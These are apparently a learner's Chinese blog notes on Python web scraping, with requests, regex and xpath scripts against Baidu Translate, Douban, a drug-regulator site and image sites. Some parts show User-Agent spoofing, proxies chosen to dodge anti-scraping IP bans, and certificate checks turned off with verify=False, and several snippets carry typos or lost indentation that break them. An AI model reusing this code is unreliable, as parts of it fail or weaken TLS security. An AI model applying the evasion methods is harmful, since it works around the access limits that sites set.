requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment">#获取url</span></span><br><span class="line">    post_url = <span class="string">&#x27;https://fanyi.baidu.com/sug&#x27;</span></span><br><span class="line">    <span class="comment">#进行UA伪装</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">#post请求的参数处理（同get请求一致）</span></span><br><span class="line">    word = <span class="built_in">input</span>(<span class="string">&#x27;输入你想翻译的东西:&#x27;</span>)</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;kw&#x27;</span>: word</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">#发送请求并生成响应</span></span><br><span class="line">    response = requests.post(url=post_url, data=data, headers=headers)</span><br><span class="line">    <span class="comment">#获取响应数据:</span></span><br><span class="line">    <span class="comment">#json()方法返回的是obj （如果确认响应数据是json类型的）</span></span><br><span class="line">    dic_obj = response.json()</span><br><span class="line"></span><br><span class="line">    <span class="comment">#持久化存储</span></span><br><span class="line">    filename = word+<span class="string">&#x27;.json&#x27;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">        json.dump(dic_obj, fp=fp, ensure_ascii=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#将jaon格式转化成dict格式</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">        great = json.load(fp)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#将字典格式化输出(此字典中存在字典与列表的嵌套现象)</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> great.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">type</span>(v) == <span class="built_in">list</span>:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> v:</span><br><span class="line">                <span class="built_in">print</span>(i)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(k)</span><br><span class="line">            <span class="built_in">print</span>(v)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;end...&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="爬取豆瓣电影信息"><a href="#爬取豆瓣电影信息" class="headerlink" title="爬取豆瓣电影信息"></a>爬取豆瓣电影信息</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##此处代码示例为失败的例子，未考虑到由ajax得到的页面依旧采用了ajax</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    url = <span class="string">&#x27;https://movie.douban.com/j/chart/top_list&#x27;</span></span><br><span class="line">    param = &#123;</span><br><span class="line">        <span class="string">&#x27;type&#x27;</span>: <span class="string">&#x27; 24&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;interval_id&#x27;</span>: <span class="string">&#x27; 100:90&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;action&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;start&#x27;</span>: <span class="string">&#x27; 1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;limit&#x27;</span>: <span class="string">&#x27; 20&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    response = requests.get(url=url, params=param, headers=headers)</span><br><span class="line"></span><br><span class="line">    list_data = response.json()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./douban.json&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">        json.dump(list_data, fp, ensure_ascii=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./douban.json&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">        great = json.load(fp)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(great)</span><br></pre></td></tr></table></figure><h1 id="爬虫学习第三天"><a href="#爬虫学习第三天" class="headerlink" title="爬虫学习第三天"></a>爬虫学习第三天</h1><h3 id="爬取国家药监总局部分信息"><a href="#爬取国家药监总局部分信息" class="headerlink" title="爬取国家药监总局部分信息"></a>爬取国家药监总局部分信息</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    url = <span class="string">&#x27;http://125.35.6.84:81/xk/itownet/portalAction.do?method=getXkzsList&#x27;</span></span><br><span class="line">    url_2 = <span class="string">&#x27;http://125.35.6.84:81/xk/itownet/portalAction.do?method=getXkzsById&#x27;</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">#爬取的页数</span></span><br><span class="line">    page_ = <span class="built_in">input</span>(<span class="string">&quot;请输入您想爬取的信息页数：&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> page <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">int</span>(page_)+<span class="number">1</span>):</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;on&#x27;</span>: <span class="string">&#x27;true&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;page&#x27;</span>: page,</span><br><span class="line">            <span class="string">&#x27;pageSize&#x27;</span>: <span class="string">&#x27;15&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;productName&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;conditionType&#x27;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;applyname&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;applysn&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">#id_list have many ids</span></span><br><span class="line">        id_list = []</span><br><span class="line">        message = []</span><br><span class="line"></span><br><span class="line">        json_list = requests.post(url=url, data=data, headers=headers).json()</span><br><span class="line">        <span class="comment">#id_a is a dict</span></span><br><span class="line">        <span class="keyword">for</span> id_a <span class="keyword">in</span> json_list[<span class="string">&quot;list&quot;</span>]:</span><br><span class="line">            id_list.append(id_a[<span class="string">&quot;ID&quot;</span>])</span><br><span class="line">            <span class="comment">#id_b是id号</span></span><br><span class="line">        <span class="keyword">for</span> id_b <span class="keyword">in</span> id_list:</span><br><span class="line">                data_2 = &#123;</span><br><span class="line">                    <span class="string">&quot;id&quot;</span>: <span class="built_in">str</span>(id_b)</span><br><span class="line">                &#125;</span><br><span class="line">                detail_message = requests.post(url=url_2, data=data_2, headers=headers).json()</span><br><span class="line">                <span class="built_in">print</span>(detail_message)</span><br><span class="line">                message.append(detail_message)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./药物信息.json&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">        json.dump(message, fp, ensure_ascii=<span class="literal">False</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;end...&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;此代码爬取时间可能有些长，也有可能会出现Timeouterror错误，多试几次可能就可以了&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;出现这种情况的原因是对方服务器拒绝请求（反爬虫），，，后续继续学习反反爬虫技术&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="数据解析概述"><a href="#数据解析概述" class="headerlink" title="数据解析概述"></a>数据解析概述</h3><ul><li>聚焦爬虫：爬取页面中指定的页面内容<pre><code>-编码流程    1、指定url    2、发起请求    3、获取相应数据    4、持久化存储    </code></pre>-数据解析分类：<pre><code>    -正则    -bs4    -xpath    </code></pre>-数据解析原理概述<pre><code>    -解析的局部的文本内容都会在标签之间或者标签对应的属性中进行存储    -1、进行指定标签的定位    -2、标签或者标签对应属性中存储的数据值进行提取（解析）</code></pre></li></ul><h3 id="图片的爬取代码"><a href="#图片的爬取代码" class="headerlink" title="图片的爬取代码"></a>图片的爬取代码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="comment">#此处url为图片地址，而非链接【地址比链接短】</span></span><br><span class="line">url = <span class="string">&#x27;https://tse4-mm.cn.bing.net/th/id/OIP.vLPcBX_5hWArkIbn_PqvYgHaGL?w=233&amp;h=195&amp;c=7&amp;o=5&amp;dpr=1.25&amp;pid=1.7&#x27;</span></span><br><span class="line">headers = &#123;</span><br><span class="line">        <span class="string">&#x27;user-agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#图片以二进制的形式存储，所以以.content形式接收，以jpg格式存</span></span><br><span class="line">data_pict = requests.get(url=url, headers=headers).content</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./beauty_pict.jpg&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">    fp.write(data_pict)</span><br></pre></td></tr></table></figure><h1 id="爬虫第四天"><a href="#爬虫第四天" class="headerlink" title="爬虫第四天"></a>爬虫第四天</h1><h3 id="爬取百度图片（星空图片）"><a href="#爬取百度图片（星空图片）" class="headerlink" title="爬取百度图片（星空图片）"></a>爬取百度图片（星空图片）</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment">#创建一个文件夹，存放图片</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="string">&#x27;./star_sky&#x27;</span>):</span><br><span class="line">        os.mkdir(<span class="string">&#x27;./star_sky&#x27;</span>)</span><br><span class="line">        </span><br><span class="line">    url = <span class="string">&#x27;https://cn.bing.com/images/search?q=%E6%98%9F%E7%A9%BA%E5%9B%BE%E7%89%87&amp;qpvt=%e6%98%9f%e7%a9%ba%e5%9b%be%e7%89%87&amp;form=IGRE&amp;first=1&amp;cw=1117&amp;ch=714&#x27;</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">            <span class="string">&#x27;user-agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    data_pict = requests.get(url=url, headers=headers).text</span><br><span class="line"></span><br><span class="line">    <span class="comment">#正则匹配</span></span><br><span class="line">    ex = <span class="string">&#x27;&lt;a class=.*?murl&amp;quot;:&amp;quot;(.*?)&amp;quot;.*?&gt;&#x27;</span></span><br><span class="line">    star_list = re.findall(ex, data_pict, re.S)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> star_list:</span><br><span class="line">        url_2 = i</span><br><span class="line">        <span class="comment">#请求到了图片的二进制数据</span></span><br><span class="line">        data_2_pict = requests.get(url=url_2, headers=headers).content</span><br><span class="line">        <span class="comment">#为图片设置名称</span></span><br><span class="line">        img_name = url_2.split(<span class="string">&quot;/&quot;</span>)[-<span class="number">1</span>]</span><br><span class="line">        img_path = <span class="string">&#x27;./star_sky/&#x27;</span> + img_name</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(img_path, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">            fp.write(data_2_pict)</span><br><span class="line">        <span class="built_in">print</span>(img_name + <span class="string">&#x27;...successful&#x27;</span>)</span><br><span class="line">        time.sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line">****************************************未完，，待更新********************************************</span><br></pre></td></tr></table></figure><h3 id="xpath"><a href="#xpath" class="headerlink" title="xpath"></a>xpath</h3><ul><li>xpath解析：最常用且最便捷高效的一种解析方式，具有通用性<pre><code>-xpath解析原理：    -1、实例化一个etree对象，且需要将被解析的页面源码数据加载到该对象中    -2、调用etree对象中的xpath方法结合着xpath表达式实现标签的定位和内容的捕获-如何实例化一个etree对象    *from lxml import etree    -1、将 本地的html文档中的源代码数据加载到etree对象中：        etree.parse(filepath)    -2、可以将从互联网上获取的数据加载到该对象中        etree.HTML(&#39;page_text&#39;)###page_text就是获取的响应数据    - xpath(&#39;xpath表达式&#39;)    -xpath表达式：            - / ：表示的是从根目录结点开始定位，表示的是一个层级                    - // : 表示的是多个层级或从任意位置开始定位（前提是//前面没有结点）                    -属性定位：tag[@attrName=&quot;attrValue&quot;]                    -索引定位：p[n] 索引是从1开始的                    -取文本：        - /text() 获取的是标签中直系的文本内容        - //text() 标签中非直系的文本内容（所有的文本内容）        -[0] 可以去除列表框            -取属性        -/@attrName        </code></pre></li></ul><h3 id="xpath代码实战示例："><a href="#xpath代码实战示例：" class="headerlink" title="xpath代码实战示例："></a>xpath代码实战示例：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#爬取妹子图片，总共有俩千多张</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    ii = <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="string">&#x27;./girl&#x27;</span>):</span><br><span class="line">        os.mkdir(<span class="string">&#x27;./girl&#x27;</span>)</span><br><span class="line">    url_list = [i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">50</span>)]</span><br><span class="line">    url_list[<span class="number">1</span>] = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> page <span class="keyword">in</span> url_list:</span><br><span class="line">        url = <span class="string">&#x27;https://www.lanvshen.com/zhongguo/&#x27;</span> + <span class="built_in">str</span>(page) +<span class="string">&#x27;.html&#x27;</span></span><br><span class="line">        headers = &#123;</span><br><span class="line">            <span class="string">&#x27;User-Agent&#x27;</span> : <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        get_text = requests.get(url=url, headers=headers)</span><br><span class="line">        tree = etree.HTML(get_text.text)</span><br><span class="line">        pict_ = tree.xpath(<span class="string">&#x27;//div[@class=&quot;hezi&quot;]//li&#x27;</span>)</span><br><span class="line">        <span class="keyword">for</span> it_ <span class="keyword">in</span> pict_:</span><br><span class="line">            img_url = it_.xpath(<span class="string">&#x27;./a/img/@src&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">            img_name = <span class="built_in">str</span>(ii) + <span class="string">&#x27;.jpg&#x27;</span></span><br><span class="line">            img = requests.get(url=img_url, headers=headers).content</span><br><span class="line">            img_path = <span class="string">&#x27;./girl/&#x27;</span> + img_name</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(img_path, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">                fp.write(img)</span><br><span class="line">            <span class="built_in">print</span>(img_name + <span class="string">&#x27;sccuessful...&#x27;</span>)</span><br><span class="line">            ii = ii + <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">##此代码存在许多不足之处，所爬取的图片都只是像素低的缩略图，并且下载速度较慢</span></span><br><span class="line"><span class="comment">##后期将学习爬取高清图片，并进行分布式爬取</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="ip代理"><a href="#ip代理" class="headerlink" title="ip代理"></a>ip代理</h3><ol><li>代理的原理：在请求目的网站之前，先请求代理服务器，然后让代理服务器去请求目的网站，<br>代理服务器拿到目的网站的数据后，再转发给我们的代码</li><li><a href="http://httpbin.org/">这个网站可以方便的查看http请求的一些参数</a> </li><li>在代码中(requests模块)使用代理：</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://httpbin.org&#x27;</span></span><br><span class="line">headers = &#123;</span><br><span class="line"><span class="string">&#x27;User-Anget&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#设置代理</span></span><br><span class="line">proxy = &#123;</span><br><span class="line"><span class="string">&#x27;http&#x27;</span>: <span class="string">&#x27;123.54.194.96:38661&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">get_text = requerts.get(url=url, headers=headers, proxies=proxy).text</span><br><span class="line"><span class="built_in">print</span>(get_text)</span><br></pre></td></tr></table></figure><ol start="4"><li>网络代理有付费和不需要付费的，不需要付费的不稳定，常常会失效</li><li>代理的作用是防止我们在爬取服务器的数据时被反爬虫而被封禁导致我们<br>的 ip 不能用而采取的措施，选择代理应选择隐蔽性高，不透明的</li></ol><h3 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h3><ul><li><p><a href="http://blog.sina.com.cn/s/blog_628571e601019uis.html">cookie与session的差异</a></p></li><li><p><a href="http://mp.weixin.qq.com/s?__biz=MjM5NjA0NjgyMA==&mid=200538817&idx=2&sn=1147d48f2320fa37e82a7daef4f31c11#rd">cookie技术深入</a>             </p><ul><li>Cookie是什么？     </li></ul><p>Cookie 是一小段文本信息，伴随着用户请求和页面在 Web 服务器和浏览器之间传递。<br>Cookie 包含每次用户访问站点时 Web 应用程序都可以读取的信息。</p><ul><li><p>为什么需要Cookie？ </p><p>因为HTTP协议是无状态的，对于一个浏览器发出的多次请求，WEB服务器无法区分 是不是来源于同一个浏览器。<br>所以，需要额外的数据用于维护会话。Cookie 正是这样的一段随HTTP请求一起被传递的额外数据。</p></li><li><p>Cookie能做什么？ </p><p>Cookie只是一段文本，所以它只能保存字符串。而且浏览器对它有大小限制以及 它会随着每次请求被发送到服务器，所以应该保证它<br>不要太大。Cookie的内容也是明文保存的，有些浏览器提供界面修改，所以， 不适合保存重要的或者涉及隐私的内容。</p></li><li><p>Cookie 的限制</p><p>大多数浏览器支持最大为 4096 字节的 Cookie。由于这限制了 Cookie 的大小，最好用 Cookie 来存储少量数据，<br>或者存储用户 ID 之类的标识符。用户 ID 随后便可用于标识用户，以及从数据库或其他数据源中读取用户信息。<br>浏览器还限制站点可以在用户计算机上存储的 Cookie 的数量。大多数浏览器只允许每个站点存储 20 个 Cookie；<br>如果试图存储更多 Cookie，则最旧的 Cookie 便会被丢弃。有些浏览器还会对它们将接受的来自所有站点的 Cookie<br>总数作出绝对限制，通常为 300 个。</p></li></ul></li></ul><p><img "" class="lazyload placeholder" data-original="C:/Users/Acer/Desktop/笔记/爬虫_day4_files/1.jpg" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="Cookie示意图">    </p><ul><li>处理cookie<br>如果想要在多次请求中共享cookie，那么应该使用session</li></ul><h3 id="处理不信任的SSL证书"><a href="#处理不信任的SSL证书" class="headerlink" title="处理不信任的SSL证书"></a>处理不信任的SSL证书</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">resp = resquests.get(url=url, vrrify=<span class="literal">False</span>).content</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="多线程"><a href="#多线程" class="headerlink" title="多线程"></a>多线程</h3><ul><li>多线程之生产者与消费者模型</li></ul><ul><li>代码示例一：(Lock版)</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">关于多线程生产者消费者模型</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">gMoney = <span class="number">1000</span></span><br><span class="line">gLock = threading.Lock()</span><br><span class="line">gTotalTimes = <span class="number">10</span></span><br><span class="line">gTimes = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 生产线程Producer</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Producer</span>(<span class="params">threading.Thread</span>):</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self</span>):</span></span><br><span class="line"><span class="keyword">global</span> gMoney</span><br><span class="line"><span class="keyword">global</span> gTimes</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">money = random.randint(<span class="number">100</span>, <span class="number">1000</span>)</span><br><span class="line">gLock.acquire()</span><br><span class="line"><span class="keyword">if</span> gTimes &gt;= gTotalTimes:</span><br><span class="line">gLock.release()</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">gMoney += money</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#123;&#125;生产了&#123;&#125;元钱，剩余&#123;&#125;元钱&#x27;</span></span><br><span class="line">  .<span class="built_in">format</span>(threading.current_thread(), money, gMoney))</span><br><span class="line">gTimes += <span class="number">1</span></span><br><span class="line">gLock.release()</span><br><span class="line">time.sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 消费线程Consumer</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Consumer</span>(<span class="params">threading.Thread</span>):</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self</span>):</span></span><br><span class="line"><span class="keyword">global</span> gMoney</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">money = random.randint(<span class="number">100</span>, <span class="number">1000</span>)</span><br><span class="line">gLock.acquire()</span><br><span class="line"><span class="keyword">if</span> gMoney &gt;= money:</span><br><span class="line">gMoney -= money</span><br><span class="line"><span 